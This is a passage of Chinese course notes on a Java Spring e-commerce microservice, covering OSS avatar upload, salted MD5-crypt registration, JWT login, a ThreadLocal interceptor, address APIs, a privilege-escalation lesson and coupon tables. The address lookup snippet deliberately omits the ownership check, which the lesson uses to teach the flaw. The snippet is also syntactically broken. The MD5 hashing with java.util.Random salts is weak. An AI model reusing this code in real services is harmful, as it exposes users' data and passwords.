        String accessKeySecret = ossConfig.getAccessKeySecret();
        //创建oss对象
        OSS ossClient = new OSSClientBuilder().build(endpoint, accessKeyId, accessKeySecret);

        //JDK8新特性写法，构建路径
        LocalDateTime ldt = LocalDateTime.now();
        DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy/MM/dd");
        String folder = dtf.format(ldt);
        String fileName = CommonUtil.generateUUID();
        String extension = originalFilename.substring(originalFilename.lastIndexOf("."));
        //在oss上创建文件夹test路径
        String newFileName = "test/" + folder + "/" + fileName + extension;
        try {
            PutObjectResult result = ossClient.putObject(bucketName, newFileName, file.getInputStream());
            //返回访问路径
            if (null != result) {
                //https://xd-test1.oss-cn-beijing.aliyuncs.com/test/1.jpg
                String imgUrl = "https://"+bucketName+"."+endpoint+"/"+newFileName;
                return imgUrl;
            }
        } catch (Exception e) {
            log.error("上传头像失败:{}",e);
        } finally {
            // 关闭OSS服务
            ossClient.shutdown();
        }

        return null;
    }
}
```

















#### 第8集  用户微服务头像上传阿里云OSS接口和SwaggerUI提效

**简介：用户微服务头像上传阿里云OSS接口和SwaggerUI提效**

* 文件上传流程

  * 先上传文件，返回url地址，再和普通表单一并提交（推荐这种,更加灵活，失败率低）
  * 文件和普通表单一并提交（设计流程比较多，容易超时和失败）

* 注意：默认SpringBoot最大文件上传是1M,大家测试的时候记得关注下

* 开发controller

  * @requestPart注解 接收文件以及其他更为复杂的数据类型
  * 比如 XXX(@RequestPart("file") MultipartFile file,  @RequestPart("userVO") UserVO userVO) 复杂协议

  ```
   /**
       * 上传用户头像
       *
       * 默认文件大小 1M,超过会报错
       *
       * @param file
       * @return
       */
   @ApiOperation("用户头像上传")
   @PostMapping(value = "upload")
   public JsonData uploadHeaderImg(@ApiParam(value = "文件上传",required = true) @RequestPart("file") MultipartFile file){
  
          String result = fileService.uploadUserHeadImg(file);
  
          return result != null?JsonData.buildSuccess(result):JsonData.buildResult(BizCodeEnum.FILE_UPLOAD_USER_IMG_FAIL);
  
      }
  ```

  

* Postman测试 (http的header是)

![image-20210202234352858](../../../Library/Application Support/typora-user-images/image-20210202234352858.png)

* SwaggerUI接口测试
  * ui界面可以直接测试文件上传































**<img src="./img/logo.png" alt="logo" style="zoom: 50%;" />   愿景："让编程不再难学，让技术与生活更加有趣"**

### 第十章 工业级用户微服务注册-登录功能开发完善



#### 第1集  用户微服务注册功能业务介绍和代码编写

**简介：用户微服务注册接口介绍和业务代码编写**

* 微服务注册接口开发

  * 请求实体类编写
  * controller
  * service
    * 邮箱验证码验证
    * 密码加密（TODO）
    * 账号唯一性检查(TODO)
    * 插入数据库
    * 新注册用户福利发放(TODO)
  * mapper

  

















#### 第2集  网络攻防-密码学的那些事情-彩虹表暴力破解

**简介：介绍信息安全，密码学的那些事情**

* 先看些例子
  * https://zhuanlan.zhihu.com/p/347964030
* 信息安全的基本目标

![image-20210203133200482](img/image-20210203133200482.png)



* 常见加密算法的分类

  ![image-20210203133244700](img/image-20210203133244700.png)

* hash算法-单项加密

![image-20210203134007614](img/image-20210203134007614.png)

```
加密过程中不需要使用密钥，输入明文后由系统直接经过加密算法处理成密文，密文无法解密。
只有重新输入明文，并经过同样的加密算法处理，得到相同的密文并被系统重新识别后，才能真正解密		

算法：MD5/SHA1/SHA224/SHA256/

优点：快速计算m，具有单向性 one-way，不可由散列值推出原消息

场景：文件完整性校验和(Checksum)算法、常规密码等

```

* 彩虹表暴力破解

  * 网站：https://www.cmd5.com/
  * 密码存储常用方式
    * 双重MD5
    * MD5+加盐
    * 双重MD5+加盐
  * 有些人会说为啥不直接用最强的Hash加密算法 ? 
    * 更安全的算法，加密解密更复杂，接口性能下降更严重

  ![image-20210203134441219](img/image-20210203134441219.png)





















#### 第3集  用户微服务注册功能核心加密逻辑完善

**简介：用户微服务注册接口加密逻辑完善**

* 聚合工程pom文件和common项目添加依赖检查

```

       <!-- https://mvnrepository.com/artifact/org.apache.commons/commons-lang3 -->
       <dependency>
           <groupId>org.apache.commons</groupId>
           <artifactId>commons-lang3</artifactId>
       </dependency>

       <!--用于加密-->
       <dependency>
           <groupId>commons-codec</groupId>
           <artifactId>commons-codec</artifactId>
       </dependency>
```

* 工具类编写

```
		/**
     * 生成指定长度随机字母和数字
     *
     * @param length
     * @return
     */
    private static final String ALL_CHAR_NUM = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    public static String getStringNumRandom(int length) {
        //生成随机数字和字母,
        Random random = new Random();
        StringBuilder saltString = new StringBuilder(length);
        for (int i = 1; i <= length; ++i) {
            saltString.append(ALL_CHAR_NUM.charAt(random.nextInt(ALL_CHAR_NUM.length())));
        }
        return saltString.toString();
    }
```

* 加盐，每个人的一般都不一样

```
			  UserDO userDO = new UserDO();
        BeanUtils.copyProperties(registerRequest, userDO);

        userDO.setCreateTime(new Date());
        userDO.setSlogan("人生需要动态规划，学习需要贪心算法");
        //生成秘钥
        userDO.setSecret("$1$" + CommonUtil.getStringNumRandom(8));
        //密码 + 加盐处理
        String cryptPwd = Md5Crypt.md5Crypt(registerRequest.getPwd().getBytes(), userDO.getSecret());
        userDO.setPwd(cryptPwd);
```



















#### 第4集  高并发下问题发现扩大思维锻炼 + 账号唯一性保证方案

**简介：高并发下账号唯一性安全保证方案**

* 注册业务

  * 同个时刻注册，需要保证账号在数据库里唯一

* 高并发下问题发现扩大

  * 万分之一的时间，放大100万倍
  * 不是你的代码安全，而是你的并发量过少，几个几十个并发量发现不了问题
  * 几十万几百万并发 ，线下难模拟
    * 代码暂停思维：假如非原子性代码运行到某一行暂停，其他线程重新操作是否会出问题
    * 时间扩大思维：1纳秒的时间，扩大到1分钟，代码逻辑是否会有问题

  

* Redis：先看redis是否有，然后没的话则是新的注册

  * key -value 存储, 配置60秒过期
  * 非原子性操作，存在不一致

* 数据库唯一索引(建表的时间已经添加)

```
 ALTER TABLE user ADD unique(`mail`)
```

























#### 第5集  用户微服务开发之登录模块逻辑和解密

**简介：用户微服务登录模块开发**

* 核心逻辑
  * 通过mail找数据库记录
  * 获取盐，和当前传递的密码就行加密后匹配
  * 生成token令牌
* controller

```
/**
     * 登录
     * @param loginRequest
     * @return
     */
    @PostMapping("login")
    public JsonData register(@RequestBody UserLoginRequest loginRequest){

        JsonData jsonData = userService.login(loginRequest);
        return jsonData;
    }

```

* service

```
/**
     * 登录
     *
     * @param vo
     * @return
     */
    @Override
    public JsonData login(UserLoginRequest loginRequest) {

        List<UserDO> list = userMapper.selectList(
                new QueryWrapper<UserDO>().eq("mail", loginRequest.getMail()));

        if (list != null && list.size() == 1) {
            UserDO userDO = list.get(0);
            String cryptPwd = Md5Crypt.md5Crypt(loginRequest.getPwd().getBytes(), userDO.getSecret());
            if (cryptPwd.equals(userDO.getPwd())) {
                //生成token令牌
               
                return JsonData.buildSuccess();
            }
            //密码错误
            return JsonData.buildResult(BizCodeEnum.ACCOUNT_PWD_ERROR);
        } else {
            //未注册
            return JsonData.buildResult(BizCodeEnum.ACCOUNT_UNREGISTER);
        }

    }
```























#### 第6集 分布式应用下登录检验解决方案 JWT讲解

**简介：分布式应用的登录检验解决方案 JWT讲解 json web token**

- 什么是JWT

  - JWT 是一个开放标准，它定义了一种用于简洁，自包含的用于通信双方之间以 JSON 对象的形式安全传递信息的方法。 可以使用 HMAC 算法或者是 RSA 的公钥密钥对进行签名
  - **简单来说: 就是通过一定规范来生成token，然后可以通过解密算法逆向解密token，这样就可以获取用户信息**

  ```
        	  {
                  id:888,
                  name:'小D',
                  expire:10000
              }
              
              funtion 加密(object, appsecret){
                  xxxx
                  return base64( token);
              }
  
              function 解密(token ,appsecret){
  
                  xxxx
                  //成功返回true,失败返回false
              }
  ```

  - 优点

    - 生产的token可以包含基本信息，比如id、用户昵称、头像等信息，避免再次查库
    - 存储在客户端，不占用服务端的内存资源

  - 缺点

    - token是经过base64编码，所以可以解码，因此token加密前的对象不应该包含敏感信息，如用户权限，密码等

    - 如果没有服务端存储，则不能做登录失效处理，除非服务端改秘钥

      

   

  

- JWT格式组成 头部、负载、签名

  - header+payload+signature
    - 头部：主要是描述签名算法
    - 负载：主要描述是加密对象的信息，如用户的id等，也可以加些规范里面的东西，如iss签发者，exp 过期时间，sub 面向的用户
    - 签名：主要是把前面两部分进行加密，防止别人拿到token进行base解密后篡改token

 

- 关于jwt客户端存储
  - 可以存储在cookie，localstorage和sessionStorage里面





















#### 第7集 登录校验Json Web Token实战之封装通用方法

**讲解：引入相关依赖并开发JWT工具类, 开发生产token和校验token的办法**

- 聚合工程加入版本依赖，common项目加入相关依赖

  ```
      <!-- JWT相关 -->
      <dependency>
        <groupId>io.jsonwebtoken</groupId>
        <artifactId>jjwt</artifactId>
        <version>0.7.0</version>
      </dependency>
  ```

   

- common项目中封装生产token方法

  ```
       /**
       * 根据用户信息，生成令牌
       *
       * @param user
       * @return
       */
      public static String geneJsonWebToken(LoginUser user) {
  
          Long userId = user.getId();
          String token = Jwts.builder().setSubject(SUBJECT)
                  .claim("head_img", user.getHeadImg())
                  .claim("id", userId)
                  .claim("name", user.getName())
                  .claim("mail", user.getMail())
                  .setIssuedAt(new Date())
                  .setExpiration(new Date(System.currentTimeMillis() + EXPIRE))
                  .signWith(SignatureAlgorithm.HS256, SECRET).compact();
  
          token = TOKEN_PREFIX + token;
  
          return token;
      }
  ```

   

- 封装校验token方法

  ```
   /**
       * 校验token的方法
       *
       * @param token
       * @return
       */
      public static Claims checkJWT(String token) {
  
          try {
  
              final Claims claims = Jwts.parser().setSigningKey(SECRET)
                      .parseClaimsJws(token.replace(TOKEN_PREFIX, "")).getBody();
  
              return claims;
  
          } catch (Exception e) {
              return null;
          }
  
      }
  
  ```

![image-20210204135204151](img/image-20210204135204151.png)

* 登录整合

  ```
                  //生成token令牌
                  LoginUser userDTO = new LoginUser();
                  BeanUtils.copyProperties(userDO, userDTO);
                  String token = JWTUtil.geneJsonWebToken(userDTO);
                  return JsonData.buildSuccess(token);
  ```

  















#### 第8集  【加餐扩展】JWT登录过期-自动刷新token方案介绍

**讲解：JWT过期自动刷新方案介绍**

* 背景

```
在前后分离场景下，越来越多的项目使用jwt token作为接口的安全机制,但存在jwt过期后，用户无法直接感知，假如在用户操作页面期间，突然提示登录，则体验很不友好，所以就有了token自动刷新需求

但是这个自动刷新方案，基本都离不开服务端状态存储，JWT推出思想是：去中心化，无状态化，所以有所违背

类似这样的业务，有阿里云首页，没有做token刷新令牌维护，但是符合对应的思想
```

![image-20210204150736637](img/image-20210204150736637.png)

* 方案：前端控制检测token，无感知刷新

```
用户登录成功的时候，一次性给他两个Token，分别为AccessToken和RefreshToken
AccessToken有效期较短,比如1天或者5天，用于正常请求
RefreshToken有效期可以设置长一些，例如10天、20天，作为刷新AccessToken的凭证

刷新方案：当AccessToken即将过期的时候，例如提前30分钟，客户端利用RefreshToken请求指定的API获取新的AccessToken并更新本地存储中的AccessToken

核心逻辑
1、登录成功后，jwt生成AccessToken； UUID生成RefreshToken并存储在服务端redis中,设置过期时间
2、接口返回3个字段AccessToken/RefreshToken/访问令牌过期时间戳
3、由于RefreshToken存储在服务端redis中，假如这个RefreshToken也过期，则提示重新登录； 


老王的疑问：RefreshToken有效期那么长，和直接将AccessToken的有效期延长有什么区别

答：RefreshToken不像AccessToken那样在大多数请求中都被使用，主要是本地检测accessToken快过期的时候才使用，
一般本地存储的时候，也不叫refreshToken,前端可以取个别名，混淆代码让攻击者不能直接识别这个就是刷新令牌


缺点：前端每次请求需要判断token距离过期时间
优点：后端压力小，代码逻辑改动不大
```









* 方案二：后端存储判断过期时间

```
后端存储AccessToken，每次请求过来都判断是否要过期，如果快要过期则重新生成新的token，并返回给前端重新存储，比如距离1天就过期的情况，如果用户访问对应的接口则会更新，但假如没访问则token已经过期则需要重新登录


优点：前端改动小，只需要存储响应http头里面是否有新的令牌产生，有的话就重新存储
缺点：后端实现复杂，且泄露后容易存在一直保活状态，且前端会存在并发请求，当并发请求收到多个jwt token时，容易生成多个token混乱使用
```



















#### 第9集  【加餐扩展】JWT令牌token泄露恶意使用-解决方案

**讲解：JWT令牌泄露解决方案-避免盗用后被恶意使用**

* 解密：使用互联网大厂的产品时经常遇到这个情况 

  * **比如阿里云或者淘宝，你现在登录了然后换个网络或者地域就需要重新登录**
  * 就是对应的token令牌，不只简单的算法加密，还包括了客户端属性、地理网络位置信息等，一起组成一个token令牌

* 如何避免token令牌泄露被恶意使用

  * ip绑定方式

  ```
  生成token的时候，加密的payload加入当前用户ip。
  
  拦截器解密后，获取payload的ip和当前访问ip判断是否同个，如果不是则提示重新登录
  
  优点：服务端无需存储相关内容，性能高，假如用户广州登录，泄露了token给杭州的黑客，依旧用不了
  
  缺点：如果用户用使用过程中ip变动频繁，则操作会经常提示重新登录，体验不友好
  
  当然也可以让用户开启安全模式和非安全模式，让用户自己知道这个情况，一些区块链、比特币交易所里面就会让用户自己选择控制这个token令牌安全是否和ip、终端、地理网络信息进行绑定
  ```

  

  ```
  					{
                  id:888,
                  name:'小D',
                  ip：“128.23.12.31”
                  expire:10000
              }
              
              funtion 加密(object, appsecret){
                  xxxx
                  return base64( token);
              }
  
              function 解密(token ,appsecret){
  					
                  xxxx
                  //成功返回true,失败返回false
              }
  ```

   























**<img src="./img/logo.png" alt="logo" style="zoom: 50%;" />   愿景："让编程不再难学，让技术与生活更加有趣"**

### 第十一章  微服务登录拦截器开发和ThreadLocal原理+经典应用



#### 第1集  用户微服务之通用登录拦截器开发

**简介：用户微服务登录拦截器开发**

* 开发登录拦截器
  * 解密JWT
  * 传递登录用户信息
    * attribute传递
    * threadLocal传递

* SpringBoot拦截器代码开发

```
@Slf4j
public class LoginInterceptor implements HandlerInterceptor {


    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
try {
            String accessToken = request.getHeader("token");
            if (accessToken == null) {
                accessToken = request.getParameter("token");
            }

            if (StringUtils.isNotBlank(accessToken)) {
                Claims claims = JWTUtil.checkJWT(accessToken);
                if (claims == null) {
                    //告诉登录过期，重新登录
                    CommonUtil.sendJsonMessage(response, JsonData.buildError("登录过期，重新登录"));
                    return false;
                }

                Long id = Long.valueOf( claims.get("id").toString());
                String headImg = (String) claims.get("head_img");
                String mail = (String) claims.get("mail");
                String name = (String) claims.get("name");

								//TODO 用户信息传递
								
                return true;

            }

        } catch (Exception e) {
            log.error("拦截器错误:{}",e);
        }

        CommonUtil.sendJsonMessage(response, JsonData.buildError("token不存在，重新登录"));
        return false;

    }



    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {

    }

    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {

    }



}

```











#### 第2集  核心知识-ThreadLocal介绍+经典应用场景

**简介：玩转ThreadLocal核心知识和应用场景**

* 什么是ThreadLocal

```
全称thread local variable（线程局部变量）功用非常简单，使用场合主要解决多线程中数据因并发产生不一致问题。

ThreadLocal为每一个线程都提供了变量的副本，使得每个线程在某时间访问到的并不是同一个对象，这样就隔离了多个线程对数据的数据共享，这样的结果是耗费了内存，但大大减少了线程同步所带来性能消耗，也减少了线程并发控制的复杂度。 

总结起来就是：同个线程共享数据

注意：ThreadLocal不能使用原子类型，只能使用Object类型
```



* 核心应用场景

```
ThreadLocal 用作每个线程内需要独立保存信息，方便同个线程的其他方法获取该信息的场景。

每个线程获取到的信息可能都是不一样的，前面执行的方法保存了信息后，后续方法可以通过ThreadLocal 直接获取到，避免了传参，类似于全局变量的概念，比如用户登录令牌解密后的信息传递（还有用户权限信息、从用户系统获取到的用户名、用户ID）
```

![image-20210204002205526](img/image-20210204002205526.png)

* 用户微服务配置token解密信息传递

```
public static ThreadLocal<LoginUser> threadLocal = new ThreadLocal<>();


                LoginUser loginUser = new LoginUser();
                loginUser.setId(id);
                loginUser.setName(name);
                loginUser.setMail(mail);
                loginUser.setHeadImg(headImg);
                threadLocal.set(loginUser);
```























#### 第3集  轻松掌握ThreadLocal底层源码解读+原理

**简介：ThreadLocal底层源码+原理讲解**

* 原理+源码介绍 

  * ThreadLocal中的一个内部类ThreadLocalMap，这个类没有实现map接口，就是一个普通的Java类，但是实现的类似map的功能

  * 每个数据用Entry保存，其中的Entry继承与WeakReference，用一个键值对存储，键为ThreadLocal的引用。

  * 每个线程持有一个ThreadLocalMap对象，每一个新的线程Thread都会实例化一个ThreadLocalMap并赋值给成员变量threadLocals，使用时若已经存在threadLocals，则直接使用已经存在的对象。

    

![image-20210204182056283](img/image-20210204182056283.png)



















#### 第4集  连环问 大厂面试-P6高级工程师-ThreadLocal常见核心面试题 

**简介：ThreadLocal常见核心面试题**

* P6面试题：ThreadLocal和Synchronized的区别 
  * 都是为了解决多线程中相同变量的访问冲突问题
  * Synchronized是通过线程等待，牺牲时间来解决访问冲突
  * ThreadLocal是通过每个线程单独一份存储空间，牺牲空间来解决冲突，
  * 对比Synchronized，ThreadLocal具有线程隔离的效果，只有在线程内才能获取到对应的值，线程外则不能访问到想要的值



* P6面试题：为啥什么ThreadLocal的键是弱引用，如果是强引用有什么问题？

  

```
Java中除了基础的数据类型以外，其它的都为引用类型。
而Java根据其生命周期的长短将引用类型又分为强引用 、 软引用 、 弱引用 、 虚引用
正常情况下我们平时基本上我们只用到强引用类型，而其他的引用类型我们也就在面试中，或者平日阅读类库或其他框架源码的时候才能见到

1、强引用 new了一个对象就是强引用  Object obj = new Object();

2、软引用的生命周期比强引用短一些,通过SoftReference类实现，当内存空间足够，垃圾回收器就不会回收它; 当JVM认为内存空间不足时，就会去试图回收软引用指向的对象，也就是说在JVM抛出OutOfMemoryError之前，会去清理软引用对象
主要用来描述一些【有用但并不是必需】的对象
使用场景：适合用来实现缓存，内存空间充足的时候将数据缓存在内存中，如果空间不足了就将其回收掉


3、弱引用是通过WeakReference类实现的，它的生命周期比软引用还要短，在GC的时候，不管内存空间足不足都会回收这个对象
使用场景：一个对象只是偶尔使用，希望在使用时能随时获取，但也不想影响对该对象的垃圾收集，则可以考虑使用弱引用来指向该对象。


ThreadLocal为什么是WeakReference呢？

如果是强引用，即使把ThreadLocal设置为null，但是ThreadLocalMap还持有ThreadLocal的强引用，如果没有手动删除，ThreadLocal不会被回收，导致Entry内存泄漏

如果是弱引用
引用ThreadLocal的对象被回收了，由于ThreadLocalMap持有ThreadLocal的弱引用，即使没有手动删除，ThreadLocal也会被回收。value在下一次ThreadLocalMap调用set、get、remove的时候会被清除。
```



















#### 第5集  登录拦截器InterceptorConfig拦截和放行路径开发配置

**简介：用户微服务登录拦截器路径配置和开发**

* 拦截器配置
  * 拦截路径
  * 不拦截路径

```
@Configuration
@Slf4j
public class InterceptorConfig  implements WebMvcConfigurer {


    public  LoginInterceptor loginInterceptor(){
        return new LoginInterceptor();
    }


    @Override
    public void addInterceptors(InterceptorRegistry registry) {

        registry.addInterceptor(loginInterceptor())
                //拦截的路径
                .addPathPatterns("/api/user/*/**","/api/address/*/**")

                //排查不拦截的路径
                .excludePathPatterns("/api/user/*/send_code","/api/user/*/captcha",
                        "/api/user/*/register","/api/user/*/login","/api/user/*/upload");

    }
}

```



















**<img src="./img/logo.png" alt="logo" style="zoom: 50%;" />   愿景："让编程不再难学，让技术与生活更加有趣"**

### 第十二章  用户信息查询和地址模块功能开发+越权攻击



#### 第1集 用户微服务之个人信息查询接口开发

**简介：用户微服务个人信息查询接口开发**

* 接口开发
  * controller开发
  * service开发
  * UserVO类编写

















#### 第2集  用户微服务之新增收货地址模块接口开发

**简介：用户微服务新增收货地址模块开发**

* 需求

  * 用户收货地址，可以进行新增
  * 有个默认的收货地址

  ![image-20210205102800034](img/image-20210205102800034.png)

* 新增收货地址接口开发和默认配置

```
@Transactional(rollbackFor = Exception.class, propagation = Propagation.REQUIRED)
    @Override
    public int add(AddressAddRequest addressAddRequest) {
        LoginUser loginUser = LoginInterceptor.threadLocal.get();
        AddressDO addressDO = new AddressDO();
        addressDO.setCreateTime(new Date());
        BeanUtils.copyProperties(addressAddRequest, addressDO);
        addressDO.setUserId(loginUser.getId());
        //是否有默认收货地址
        if (addressDO.getDefaultStatus() == 1) {
            AddressDO defaultAddressDO = addressMapper.selectOne(new QueryWrapper<AddressDO>().eq("user_id", loginUser.getId()).eq("default_status", 1));
            if (defaultAddressDO != null) {
                //修改为非默认地址
                defaultAddressDO.setDefaultStatus(0);
                addressMapper.update(defaultAddressDO, new QueryWrapper<AddressDO>().eq("id", defaultAddressDO.getId()));
            }
        }
        int rows = addressMapper.insert(addressDO);
        return rows;
    }
```

















#### 第3集  收货地址模块-查找接口开发和删除地址接口开发

**简介：用户微服务收货地址查找接口开发和删除地址接口**

* 查找收货地址接口开发

```
@Override
    public AddressVO findById(long addressId) {
        
        AddressDO addressDO = addressMapper.selectOne(new QueryWrapper<AddressDO>().eq("id", addressId)
        if (addressDO == null) {
            return null;
        }
        AddressVO addressVO = new AddressVO();
        BeanUtils.copyProperties(addressDO, addressVO);
        return addressVO;
    }
```

* 删除指定收货地址

```
    @Override
    public int del(long addressId) {
        LoginUser loginUser = LoginInterceptor.threadLocal.get();
        int rows = addressMapper.delete(new QueryWrapper<AddressDO>().eq("id", addressId).eq("user_id", loginUser.getId()));
        return rows;

    }
```



* 通用返回状态码

```

    /**
     * 通用操作码
     */
    OPS_REPEAT(110001,"重复操作"),


    /**
     * 购物车
     */
    CART_FAIL(220001,"添加购物车失败"),


    /**
     *验证码
     */
    CODE_TO_ERROR(240001,"接收号码不合规"),
    CODE_LIMITED(240002,"验证码发送过快"),
    CODE_ERROR(240003,"验证码错误"),
    CODE_CAPTCHA(240101,"图形验证码错误"),



    /**
     * 账号
     */
    ACCOUNT_REPEAT(250001,"账号已经存在"),
    ACCOUNT_UNREGISTER(250002,"账号不存在"),
    ACCOUNT_PWD_ERROR(250003,"账号或者密码错误"),


    /**
     * 优惠券
     */
    COUPON_CONDITION_ERROR(270001,"优惠券条件错误"),
    COUPON_UNAVAILABLE(270002,"没有可用的优惠券"),
    COUPON_NO_EXITS(270003,"优惠券不存在"),
    COUPON_NO_STOCK(270005,"优惠券库存不足"),
    COUPON_OUT_OF_LIMIT(270006,"优惠券领取超过限制次数"),
    COUPON_OUT_OF_TIME(270407,"优惠券不在领取时间范围"),
    COUPON_GET_FAIL(270407,"优惠券领取失败"),
    COUPON_RECORD_LOCK_FAIL(270409,"优惠券锁定失败"),


    /**
     * 订单
     */
    ORDER_CONFIRM_COUPON_FAIL(280001,"创建订单-优惠券使用失败,不满足价格条件"),
    ORDER_CONFIRM_PRICE_FAIL(280002,"创建订单-验价失败"),
    ORDER_CONFIRM_LOCK_PRODUCT_FAIL(280003,"创建订单-商品库存不足锁定失败"),
    ORDER_CONFIRM_ADD_STOCK_TASK_FAIL(280004,"创建订单-新增商品库存锁定任务"),
    ORDER_CONFIRM_TOKEN_NOT_EXIST(280008,"订单令牌缺少"),
    ORDER_CONFIRM_TOKEN_EQUAL_FAIL(280009,"订单令牌不正确"),
    ORDER_CONFIRM_NOT_EXIST(280010,"订单不存在"),
    ORDER_CONFIRM_CART_ITEM_NOT_EXIST(280011,"购物车商品项不存在"),

    /**
     * 收货地址
     */
    ADDRESS_ADD_FAIL(290001,"新增收货地址失败"),
    ADDRESS_DEL_FAIL(290002,"删除收货地址失败"),
    ADDRESS_NO_EXITS(290003,"地址不存在"),

    /**
     * 支付
     */
    PAY_ORDER_FAIL(300001,"创建支付订单失败"),
    PAY_ORDER_CALLBACK_SIGN_FAIL(300002,"支付订单回调验证签失败"),
    PAY_ORDER_CALLBACK_NOT_SUCCESS(300003,"创建支付订单失败"),
    PAY_ORDER_NOT_EXIST(300005,"订单不存在"),
    PAY_ORDER_STATE_ERROR(300006,"订单状态不正常"),
    PAY_ORDER_PAY_TIMEOUT(300007,"订单支付超时"),




    /**
     * 流控操作
     */

    CONTROL_FLOW(500101,"限流控制"),
    CONTROL_DEGRADE(500201,"降级控制"),
    CONTROL_AUTH(500301,"认证控制"),


    /**
     * 文件相关
     */
    FILE_UPLOAD_USER_IMG_FAIL(600101,"用户头像文件上传失败");

```











#### 第4集  列举指定用户全部收货地址接口开发

**简介：用户微服务列举指定用户全部收货地址接口开发**



* 列举指定用户全部收获地址

```
    @Override
    public List<AddressVO> listUserAllAddress() {
        LoginUser loginUser = LoginInterceptor.threadLocal.get();
        List<AddressDO> list = addressMapper.selectList(new QueryWrapper<AddressDO>().eq("user_id", loginUser.getId()));

        List<AddressVO> addressVOList = list.stream().map(obj -> {
            AddressVO addressVO = new AddressVO();
            BeanUtils.copyProperties(obj, addressVO);
            return addressVO;
        }).collect(Collectors.toList());
        return addressVOList;
    }
```























#### 第5集  越权攻击-多数人容易忽视数据安全问题

**简介：基于原先编写的接口，指出存在问题**

* 查看他人的数据
* 删除他人的数据

![image-20210205142444201](img/image-20210205142444201.png)





















#### 第6集  水平-垂直越权攻击和代码防范

**简介：介绍水平-垂直越权攻击和代码防范**



* 越权攻击介绍

  ```
  是Web应用程序中一种常见的漏洞，由于其存在范围广、危害大, 列为Web应用十大安全隐患的第二名
  
  指应用在检查授权时存在纰漏，使得攻击者在获得低权限用户账户后，利用一些方式绕过权限检查，访问或者操作其他用户或者更高权限.
  
  产生原因：主要是因为开发人员在对数据进行增、删、改、查询时对客户端请求的数据过分相信，而遗漏了权限的判定
  ```

  

  * 水平越权
    * 攻击者尝试访问与他拥有相同权限的用户的资源
    * 例子：A用户可以直接操作到B用户的数据
  * 垂直越权
    * 一个低级别攻击者尝试访问高级别用户的资源
    * 例子：普通管理员登录，拼接浏览器地址，直接访问高级管理员的页面

* 大家检查下自己项目和公司是否有这个越权问题





* 防范水平越权

```
建立用户和可操作资源的绑定关系，用户对任何资源进行操作时，通过该绑定关系确保该资源是属于该用户所有的
```

* 防范垂直越权

```
基于RBAC角色访问控制机制来防止纵向越权攻击，定义不同的权限角色，为每个角色分配不同的权限，当用户执行某个动作或产生某种行为时，通过用户所在的角色判定该动作或者行为是否允许。
```















#### 第7集  用户微服务-水平权限攻击问题修复

**简介：修复用户微服务下水平权限攻击问题**



* 防范水平越权

```
建立用户和可操作资源的绑定关系，用户对任何资源进行操作时，通过该绑定关系确保该资源是属于该用户所有的
```























**<img src="./img/logo.png" alt="logo" style="zoom: 50%;" />   愿景："让编程不再难学，让技术与生活更加有趣"**

### 第十三章 电商优惠券微服务业务介绍和模块开发

-

#### 第1集  互联网公司中优惠券微服务业务介绍和效果体验

**简介：介绍常见的优惠券业务和课程案例效果体验**

* 互联网企业最重要的是拉新业务，产品经理 自然诞生了很多玩法
  * 砍价
  * 拼团
  * 裂变
  * 优惠券

![image-20210206123534355](img/image-20210206123534355.png)

* 电商优惠券逻辑，优惠券的玩法很多，主要讲一下比较常见的优惠券

  

  * 获取方式维度

    * 被动：新人优惠券

      * 无门槛现金劵
      * ...其他

      ```
      第一次登录注册某平台，登录成功后进入到首个页面弹出新人红包或者某固定位置领取新人红包，前端领取位置及细节不做详细讲解，根据实际业务场景而定
      ```

    * 主动：领取优惠券

      * 满减劵

      * ...其他

      ```
      促进商品订单成交，而设置的优惠券，提高下单支付率
      ```

  * 使用门槛维度

    * 无门槛现金劵
    * 满减劵
    * 满减折扣卷
    * 运费抵扣券
    * 兑换券
    * 店铺劵
    * 单品劵
    * ...其他

    ```
    按照多维度设计，就需要用到规则引擎，这类一般是大厂的营销中台设计的，复杂且容易出问题
    ```

    

* 优惠券常见属性

  * 类型：无门槛、满减、单品、折扣等
  * 每人领劵次数
  * 发券总量
  * 优惠券开始时间和结束时间

  

  

* 天猫超市图

<img src="img/image-20210206123239171.png" alt="logo" style="zoom: 50%;" />

* 课程案例图

![image-20210206123345115](img/image-20210206123345115.png)

![image-20210206123816580](img/image-20210206123816580.png)























#### 第2集 1024电商平台优惠券微服务业务介绍和数据库建立

**简介：优惠券微服务介绍和效果体验**

* 大课优惠券业务需求介绍
  * 新用户注册-发放后端配置的新人优惠券
  * 用户可以主动领取优惠券
  * 下单可以选择对应的优惠券抵扣
  * 支持满减优惠券-无门槛优惠券两种
  * 多种元数据配置
    * 类型：无门槛、满减等
    * 每人领劵次数限制
    * 发券总量控制
    * 优惠券开始时间和结束时间
    * 优惠券状态配置
* 核心知识：
  * 高并发下扣减劵库存
    * 超发
    * 单人超领取
* 原生分布式锁+redisson框架分布锁使用
  * 分布式锁+最佳实践

* 数据库表介绍

```
#优惠券表
CREATE TABLE `coupon` (
  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT 'id',
  `category` varchar(11) DEFAULT NULL COMMENT '优惠卷类型[NEW_USER注册赠券，TASK任务卷，PROMOTION促销劵]',
  `publish` varchar(11) DEFAULT NULL COMMENT '发布状态, PUBLISH发布，DRAFT草稿，OFFLINE下线',
  `coupon_img` varchar(524) DEFAULT NULL COMMENT '优惠券图片',
  `coupon_title` varchar(128) DEFAULT NULL COMMENT '优惠券标题',
  `price` decimal(16,2) DEFAULT NULL COMMENT '抵扣价格',
  `user_limit` int(11) DEFAULT NULL COMMENT '每人限制张数',
  `start_time` datetime DEFAULT NULL COMMENT '优惠券开始有效时间',
  `end_time` datetime DEFAULT NULL COMMENT '优惠券失效时间',
  `publish_count` int(11) DEFAULT NULL COMMENT '优惠券总量',
  `stock` int(11) DEFAULT '0' COMMENT '库存',
  `create_time` datetime DEFAULT NULL,
  `condition_price` decimal(16,2) DEFAULT NULL COMMENT '满多少才可以使用',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=23 DEFAULT CHARSET=utf8mb4;


#优惠券领劵记录
CREATE TABLE `coupon_record` (
  `id` bigint(11) unsigned NOT NULL AUTO_INCREMENT,
